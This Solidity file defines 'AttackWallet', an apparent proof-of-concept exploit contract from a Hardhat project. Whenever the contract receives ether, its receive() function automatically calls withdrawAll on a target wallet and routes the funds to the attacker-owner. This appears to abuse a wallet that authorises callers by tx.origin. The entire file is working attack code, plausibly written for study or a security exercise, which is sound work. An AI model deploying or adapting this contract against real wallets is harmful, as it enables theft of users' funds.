//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.9;

import "hardhat/console.sol";
import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";

interface IWallet {
  function withdrawAll(address reciever) external;
}

contract AttackWallet is Ownable {
  IWallet private immutable wallet;

  constructor(IWallet _wallet) {
    wallet = _wallet;
  }

  receive() external payable {
    wallet.withdrawAll(owner());
  }
}
